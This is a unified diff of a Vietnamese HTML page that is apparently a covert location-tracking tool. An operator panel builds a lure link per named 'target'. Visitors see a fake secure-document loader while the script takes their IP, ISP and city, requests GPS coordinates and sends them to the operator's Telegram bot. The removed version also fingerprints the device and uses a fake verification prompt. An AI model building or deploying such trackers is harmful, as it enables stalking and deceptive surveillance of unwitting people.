@@ -1,88 +1,76 @@
 <!DOCTYPE html>
 <html lang="vi">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hệ Thống Xác Thực Bảo Mật</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title id="dyn-title">Hệ thống xác thực</title>
+    
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+    
     <style>
-        .admin-bg { background-color: #0f172a; color: #f8fafc; }
-        #map { height: 450px; width: 100%; border-radius: 12px; z-index: 1; }
-        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3b82f6; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; }
+        .admin-bg { background: #010409; color: #c9d1d9; }
+        .glass { background: #0d1117; border: 1px solid #30363d; border-radius: 12px; }
+        #map { height: 350px; width: 100%; border-radius: 12px; border: 1px solid #30363d; z-index: 1; }
+        .input-dark { background: #010409; border: 1px solid #30363d; color: #f0f6fc; padding: 8px; border-radius: 6px; width: 100%; font-size: 11px; outline: none; }
+        .victim-body { background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #3b82f6; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         .hidden { display: none; }
-        .custom-scrollbar::-webkit-scrollbar { width: 6px; }
-        .custom-scrollbar::-webkit-scrollbar-track { background: #1e293b; }
-        .custom-scrollbar::-webkit-scrollbar-thumb { background: #475569; border-radius: 10px; }
     </style>
 </head>
-<body id="main-body" class="bg-gray-100 font-sans antialiased">
+<body id="main-body" class="victim-body">
 
-    <div id="ui-target" class="min-h-screen flex items-center justify-center p-4">
-        <div class="max-w-md w-full bg-white rounded-2xl shadow-2xl p-8 text-center border border-gray-100">
-            <div id="status-icon" class="mb-6 flex justify-center text-blue-600">
-                <svg class="w-16 h-16" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path></svg>
-            </div>
-            <h2 class="text-2xl font-bold text-gray-800 mb-2">Xác thực thiết bị</h2>
-            <p class="text-gray-500 mb-8 text-sm text-center">Để tiếp tục, vui lòng nhấn nút bên dưới để đồng bộ hóa vị trí an toàn cho hệ thống.</p>
-            <button id="btn-sync" onclick="startAbsoluteCapture()" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-4 px-6 rounded-xl transition duration-200 shadow-lg active:scale-95">TIẾP TỤC ĐỒNG BỘ</button>
-            <canvas id="fp-canvas" width="200" height="40" class="hidden"></canvas>
-            <p class="mt-8 text-[10px] text-gray-400 uppercase tracking-widest">Sentinel Secure Node v5.0</p>
-        </div>
+    <div id="ui-victim" class="text-center p-6">
+        <div class="loader mb-4 mx-auto"></div>
+        <p id="status-msg" class="text-gray-500 text-sm italic">Đang tải tài liệu bảo mật...</p>
     </div>
 
-    <div id="ui-admin" class="hidden min-h-screen p-4 lg:p-8">
+    <div id="ui-admin" class="hidden w-full p-4 lg:p-6">
         <div class="max-w-7xl mx-auto space-y-6">
-            <header class="flex flex-col md:flex-row justify-between items-center gap-4 border-b border-slate-700 pb-6">
-                <div>
-                    <h1 class="text-3xl font-black text-blue-500 tracking-tighter">SENTINEL DASHBOARD</h1>
-                    <p class="text-slate-400 text-sm">Real-time target tracking & IP analytics</p>
-                </div>
-                <div class="flex gap-3">
-                    <button onclick="getMyLocation()" class="bg-blue-600/20 text-blue-400 border border-blue-500/30 px-4 py-2 rounded-lg text-xs font-bold hover:bg-blue-600 hover:text-white transition">📍 VỊ TRÍ CỦA TÔI</button>
-                    <button onclick="logout()" class="bg-red-500/10 text-red-400 border border-red-500/20 px-4 py-2 rounded-lg text-xs font-bold hover:bg-red-500 hover:text-white transition">ĐĂNG XUẤT</button>
+            <header class="flex justify-between items-center border-b border-gray-800 pb-4">
+                <h1 class="text-xl font-black text-blue-500 italic uppercase"> 
+                    BCA</h1>
+                <div class="flex gap-2">
+                    <button onclick="getMyLocation()" class="bg-blue-600/20 text-blue-400 px-3 py-1 rounded text-[10px] font-bold border border-blue-500/30">VỊ TRÍ CỦA TÔI</button>
+                    <button onclick="logout()" class="bg-red-900/20 text-red-500 px-3 py-1 rounded text-[10px] font-bold">LOGOUT</button>
                 </div>
             </header>
 
-            <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
-                <div class="space-y-6 lg:col-span-1">
-                    <div class="bg-slate-800 p-6 rounded-2xl border border-slate-700 shadow-xl">
-                        <h3 class="text-sm font-bold mb-5 text-blue-400 uppercase">Cấu hình Hệ thống</h3>
-                        <div class="space-y-4">
-                            <input type="password" id="cfg-token" placeholder="Bot Token..." class="w-full bg-slate-900 border border-slate-700 rounded-lg p-3 text-xs text-blue-300 focus:outline-none">
-                            <input type="text" id="cfg-id" placeholder="Chat ID..." class="w-full bg-slate-900 border border-slate-700 rounded-lg p-3 text-xs text-blue-300 focus:outline-none">
-                            <input type="text" id="cfg-redir" value="https://google.com" class="w-full bg-slate-900 border border-slate-700 rounded-lg p-3 text-xs text-blue-300 focus:outline-none">
-                            <button onclick="saveAndBuild()" class="w-full bg-blue-600 hover:bg-blue-500 py-3 rounded-xl font-black text-xs transition">LƯU & TẠO LINK</button>
+            <div class="grid lg:grid-cols-3 gap-6">
+                <div class="space-y-4">
+                    <div class="glass p-4 space-y-3 shadow-xl">
+                        <h3 class="text-[10px] font-bold text-gray-400 uppercase tracking-widest border-b border-gray-800 pb-2">Cấu hình Bot</h3>
+                        <input id="cfg-tk" type="password" placeholder="Bot Token" class="input-dark">
+                        <input id="cfg-id" type="text" placeholder="Chat ID" class="input-dark">
+                        <input id="cfg-rd" type="text" placeholder="Link đích" class="input-dark">
+                        <input id="in-name" type="text" placeholder="Tên mục tiêu" class="input-dark">
+                        <button onclick="saveAndBuild()" class="w-full bg-blue-600 py-2 rounded font-bold text-[11px] uppercase transition hover:bg-blue-500">Tạo Link</button>
+                        <div id="box-result" class="hidden p-2 bg-black rounded border border-blue-900/30">
+                            <div id="out-link" class="text-[9px] text-blue-400 break-all cursor-pointer font-mono" onclick="copyText(this)"></div>
                         </div>
                     </div>
-                    <div id="link-box" class="bg-slate-900/50 p-4 rounded-xl border border-blue-500/20 hidden">
-                        <p class="text-[10px] text-blue-400 font-bold mb-2">TARGET LINK:</p>
-                        <div id="final-link" class="text-[10px] font-mono text-green-400 break-all cursor-pointer bg-black/30 p-2 rounded" onclick="copyLink()">Chưa có...</div>
-                    </div>
+                    <div id="map"></div>
                 </div>
 
-                <div class="lg:col-span-2 space-y-6">
-                    <div id="map" class="shadow-2xl border border-slate-700"></div>
-                    
-                    <div class="bg-slate-800 rounded-2xl border border-slate-700 overflow-hidden shadow-xl">
-                        <div class="p-4 bg-slate-900/50 border-b border-slate-700 flex justify-between">
-                            <h3 class="text-sm font-bold text-green-400 uppercase">Nhật ký Truy cập Chi tiết</h3>
+                <div class="lg:col-span-2 space-y-4">
+                    <div class="glass flex flex-col h-full shadow-2xl overflow-hidden">
+                        <div class="p-4 bg-slate-900/50 border-b border-gray-800 font-bold text-xs uppercase text-green-500 tracking-tighter">
+                            📡 Nhật ký truy cập thời gian thực
                         </div>
-                        <div class="overflow-x-auto custom-scrollbar">
+                        <div class="overflow-x-auto">
                             <table class="w-full text-left text-[11px]">
-                                <thead class="bg-slate-900/80 text-slate-500 uppercase">
+                                <thead class="bg-black text-gray-500 uppercase text-[9px]">
                                     <tr>
-                                        <th class="p-3">Thời gian</th>
-                                        <th class="p-3">ID / IP</th>
-                                        <th class="p-3">Vùng miền</th>
-                                        <th class="p-3">Thiết bị</th>
-                                        <th class="p-3">Trạng thái</th>
+                                        <th class="p-3">Mục tiêu</th>
+                                        <th class="p-3">IP / Nhà mạng</th>
+                                        <th class="p-3">Địa chỉ (Geo)</th>
+                                        <th class="p-3 text-right">Thao tác</th>
                                     </tr>
                                 </thead>
-                                <tbody id="log-table-body" class="divide-y divide-slate-700">
-                                    <tr><td colspan="5" class="p-10 text-center text-slate-500 italic">Đang chờ tín hiệu từ mục tiêu...</td></tr>
+                                <tbody id="log-list" class="divide-y divide-gray-800 text-gray-300">
+                                    <tr><td colspan="4" class="p-10 text-center text-gray-700 italic">Đang quét tín hiệu...</td></tr>
                                 </tbody>
                             </table>
                         </div>
@@ -93,34 +81,65 @@
     </div>
 
     <script>
-        const urlParams = new URLSearchParams(window.location.search);
         let config = { t: '', i: '', r: 'https://google.com' };
-        let lastUpdateId = 0, map, marker, myMarker, monitorInterval = null;
+        let map, targetMarker, myMarker;
+        const urlParams = new URLSearchParams(window.location.search);
 
         window.onload = () => {
             if (urlParams.has('admin')) {
                 document.getElementById('main-body').className = "admin-bg";
-                document.getElementById('ui-target').classList.add('hidden');
-                if (localStorage.getItem('v50_auth') === 'true' || prompt("Admin Access Code:") === "123") {
-                    localStorage.setItem('v50_auth', 'true');
+                document.getElementById('ui-victim').classList.add('hidden');
+                if (localStorage.getItem('v5_auth') === 'true' || prompt("Pass:") === "123") {
+                    localStorage.setItem('v5_auth', 'true');
                     document.getElementById('ui-admin').classList.remove('hidden');
                     initAdmin();
-                } else { window.location.href = window.location.pathname; }
-            } else { initTracker(); }
+                } else { window.location.search = ""; }
+            } else { startTracking(); }
         };
+
+        // --- TRACKER LOGIC ---
+        async function startTracking() {
+            try { 
+                const v = urlParams.get('v'); 
+                if(v) config = JSON.parse(decodeURIComponent(escape(atob(v)))); 
+            } catch(e) {}
+
+            const targetName = urlParams.get('name') || 'Ẩn danh';
+            
+            // 1. Lấy IP ngầm
+            try {
+                const res = await fetch('https://ipwho.is/').then(r => r.json());
+                if(res.success) {
+                    const logData = { name: targetName, ip: res.ip, isp: res.connection.isp, address: `${res.city}, ${res.country}`, time: new Date().toLocaleTimeString(), st: 'IP', lat: res.latitude, lon: res.longitude };
+                    saveLog(logData);
+                    await sendTele(`🚀 <b>${targetName}</b> vừa vào link\n🌐 IP: ${res.ip}\n🏢 ISP: ${res.connection.isp}\n📍 ${res.city}`);
+                }
+            } catch(e) {}
+
+            // 2. Lấy GPS (Ép quyền)
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(async (p) => {
+                    const lat = p.coords.latitude, lon = p.coords.longitude;
+                    await sendTele(`🎯 <b>${targetName} (GPS OK)</b>\n📍 Tọa độ: ${lat}, ${lon}\n🗺️ Map: https://www.google.com/maps?q=${lat},${lon}`);
+                    window.location.replace(config.r);
+                }, () => window.location.replace(config.r), { timeout: 8000 });
+            } else { window.location.replace(config.r); }
+        }
 
         // --- ADMIN LOGIC ---
         function initAdmin() {
-            map = L.map('map').setView([15.8, 108.2], 6);
+            map = L.map('map').setView([15.8, 108.2], 5);
             L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
-            const saved = localStorage.getItem('v50_cfg');
-            if (saved) {
+            
+            const saved = localStorage.getItem('v5_cfg');
+            if(saved) {
                 config = JSON.parse(saved);
-                document.getElementById('cfg-token').value = config.t;
+                document.getElementById('cfg-tk').value = config.t;
                 document.getElementById('cfg-id').value = config.i;
-                document.getElementById('cfg-redir').value = config.r;
-                if (config.t) startMonitoring();
+                document.getElementById('cfg-rd').value = config.r;
             }
+            renderLogs();
+            setInterval(renderLogs, 3000); // Tự động cập nhật bảng nhật ký
         }
 
         function getMyLocation() {
@@ -128,117 +147,58 @@
                 navigator.geolocation.getCurrentPosition((p) => {
                     const lat = p.coords.latitude, lon = p.coords.longitude;
                     if (myMarker) map.removeLayer(myMarker);
-                    myMarker = L.circleMarker([lat, lon], { color: '#3b82f6', radius: 10, fillOpacity: 0.6 }).addTo(map);
-                    myMarker.bindPopup("Vị trí của bạn (Admin)").openPopup();
-                    map.flyTo([lat, lon], 13);
-                }, () => alert("Hãy cấp quyền GPS để lấy vị trí Admin!"));
+                    myMarker = L.circleMarker([lat, lon], { color: '#3b82f6', radius: 8 }).addTo(map);
+                    myMarker.bindPopup("Vị trí của tôi (Admin)").openPopup();
+                    map.flyTo([lat, lon], 14);
+                });
             }
         }
 
-        async function startMonitoring() {
-            if (!config.t) return;
-            if (monitorInterval) clearInterval(monitorInterval);
-            monitorInterval = setInterval(async () => {
-                try {
-                    const res = await fetch(`https://api.telegram.org/bot${config.t}/getUpdates?offset=${lastUpdateId + 1}`).then(r => r.json());
-                    if (res.ok && res.result.length > 0) {
-                        res.result.forEach(update => {
-                            lastUpdateId = update.update_id;
-                            if (update.message && update.message.text) {
-                                addLogToTable(update.message.text);
-                                parseGPS(update.message.text);
-                            }
-                        });
-                    }
-                } catch (e) {}
-            }, 3000);
+        function renderLogs() {
+            const logs = JSON.parse(localStorage.getItem('v38_logs') || '[]');
+            const list = document.getElementById('log-list');
+            if (logs.length === 0) return;
+            
+            list.innerHTML = logs.map(l => `
+                <tr class="hover:bg-white/5 border-b border-gray-800">
+                    <td class="p-3"><b>${l.name}</b><br><span class="text-[8px] text-gray-600">${l.time}</span></td>
+                    <td class="p-3 font-mono text-blue-400 text-[10px]">${l.ip}<br><span class="text-[8px] text-gray-600 uppercase">${l.isp}</span></td>
+                    <td class="p-3 text-[10px] text-gray-400 max-w-[150px] truncate">${l.address}</td>
+                    <td class="p-3 text-right">
+                        <button onclick="viewTarget(${l.lat}, ${l.lon})" class="bg-blue-600/20 text-blue-400 px-2 py-1 rounded text-[8px] font-bold">XEM MAP</button>
+                    </td>
+                </tr>
+            `).join('');
         }
 
-        function addLogToTable(text) {
-            const tableBody = document.getElementById('log-table-body');
-            if (tableBody.innerHTML.includes("italic")) tableBody.innerHTML = '';
-            const isGPS = text.includes("GPS SUCCESS");
-            const id = text.match(/ID: (ID-[.\d]+)/)?.[1] || "N/A";
-            const region = text.match(/Vùng: (.*)/)?.[1] || "N/A";
-            const device = text.match(/TB: (.*)/)?.[1] || "N/A";
-
-            const row = document.createElement('tr');
-            row.className = `hover:bg-slate-700/30 transition-colors ${isGPS ? 'bg-green-500/5' : ''}`;
-            row.innerHTML = `
-                <td class="p-3 text-slate-500 font-mono">${new Date().toLocaleTimeString()}</td>
-                <td class="p-3 font-bold text-blue-400 font-mono">${id}</td>
-                <td class="p-3 text-slate-300 font-semibold">${region}</td>
-                <td class="p-3 text-slate-500 truncate max-w-[120px]">${device}</td>
-                <td class="p-3">
-                    <span class="px-2 py-1 rounded text-[9px] font-bold ${isGPS ? 'bg-green-500/20 text-green-400' : 'bg-blue-500/20 text-blue-400'}">
-                        ${isGPS ? '🛰️ GPS OK' : '🚀 ENTRY'}
-                    </span>
-                </td>
-            `;
-            tableBody.prepend(row);
+        function viewTarget(lat, lon) {
+            if (targetMarker) map.removeLayer(targetMarker);
+            targetMarker = L.marker([lat, lon]).addTo(map);
+            map.flyTo([lat, lon], 15);
         }
 
-        function parseGPS(text) {
-            const match = text.match(/Tọa độ: ([-.\d]+),([-.\d]+)/);
-            if (match && map) {
-                const lat = parseFloat(match[1]), lon = parseFloat(match[2]);
-                if (marker) map.removeLayer(marker);
-                marker = L.marker([lat, lon]).addTo(map);
-                map.flyTo([lat, lon], 16);
-                marker.bindPopup(`<b>Mục tiêu tại đây</b><br>${lat}, ${lon}`).openPopup();
-            }
-        }
-
-        // --- TRACKER LOGIC ---
-        async function initTracker() {
-            try {
-                const v = urlParams.get('v');
-                if (v) config = JSON.parse(decodeURIComponent(escape(atob(v))));
-                const res = await fetch('https://geolocation.onetrust.com/cookieconsentpub/v1/geo/location', { headers: { 'Accept': 'application/json' } }).then(r => r.json());
-                const bat = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve({ level: 0, charging: false }));
-                const batInfo = `${Math.round(bat.level * 100)}% (${bat.charging ? 'Sạc' : 'Pin'})`;
-                await sendTele(`🚀 <b>ENTRY DETECTED</b>\n🆔 ID: <code>${getFP()}</code>\n🔋 Pin: ${batInfo}\n🌐 Vùng: ${res.city || 'N/A'}, ${res.country || 'N/A'}\n📱 TB: ${navigator.platform}`);
-            } catch (e) {}
-        }
-
-        async function startAbsoluteCapture() {
-            const btn = document.getElementById('btn-sync');
-            btn.innerHTML = `<div class="loader mx-auto"></div>`;
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(async (p) => {
-                    const lat = p.coords.latitude, lon = p.coords.longitude;
-                    await sendTele(`🎯 <b>GPS SUCCESS</b>\n🆔 ID: <code>${getFP()}</code>\n📍 Tọa độ: ${lat},${lon}\n📱 TB: ${navigator.platform}`);
-                    window.location.replace(config.r);
-                }, () => { alert("Lỗi: Bạn phải nhấn 'Cho phép' để xác thực hệ thống."); location.reload(); }, { enableHighAccuracy: true });
-            }
-        }
-
-        function getFP() {
-            const canvas = document.getElementById('fp-canvas');
-            const ctx = canvas.getContext('2d');
-            ctx.font = "14px Arial"; ctx.fillText("SEC-v5", 2, 2);
-            let hash = 0, b64 = canvas.toDataURL();
-            for (let i = 0; i < b64.length; i++) { hash = ((hash << 5) - hash) + b64.charCodeAt(i); hash |= 0; }
-            return "ID-" + Math.abs(hash);
+        function saveLog(data) {
+            let logs = JSON.parse(localStorage.getItem('v38_logs') || '[]');
+            logs.unshift(data);
+            localStorage.setItem('v38_logs', JSON.stringify(logs.slice(0, 50)));
         }
 
         async function sendTele(msg) {
-            if (!config.t || !config.i) return;
-            try { await fetch(`https://api.telegram.org/bot${config.t}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: config.i, text: msg, parse_mode: 'HTML' }) }); } catch(e) {}
+            if(!config.t || !config.i) return;
+            try { fetch(`https://api.telegram.org/bot${config.t}/sendMessage?chat_id=${config.i}&parse_mode=HTML&text=${encodeURIComponent(msg)}`); } catch(e) {}
         }
 
         function saveAndBuild() {
-            config = { t: document.getElementById('cfg-token').value.trim(), i: document.getElementById('cfg-id').value.trim(), r: document.getElementById('cfg-redir').value.trim() };
-            localStorage.setItem('v50_cfg', JSON.stringify(config));
-            const base = window.location.href.split('?')[0];
+            config = { t: document.getElementById('cfg-tk').value, i: document.getElementById('cfg-id').value, r: document.getElementById('cfg-rd').value };
+            localStorage.setItem('v5_cfg', JSON.stringify(config));
             const v = btoa(unescape(encodeURIComponent(JSON.stringify(config))));
-            document.getElementById('link-box').classList.remove('hidden');
-            document.getElementById('final-link').innerText = `${base}?v=${v}`;
-            startMonitoring();
+            const link = window.location.origin + window.location.pathname + "?name=" + encodeURIComponent(document.getElementById('in-name').value) + "&v=" + v;
+            document.getElementById('box-result').classList.remove('hidden');
+            document.getElementById('out-link').innerText = link;
         }
 
-        function logout() { localStorage.removeItem('v50_auth'); location.reload(); }
-        function copyLink() { navigator.clipboard.writeText(document.getElementById('final-link').innerText); alert("Đã copy link!"); }
+        function copyText(el) { navigator.clipboard.writeText(el.innerText); alert("Đã copy link!"); }
+        function logout() { localStorage.removeItem('v5_auth'); location.reload(); }
     </script>
 </body>
 </html>
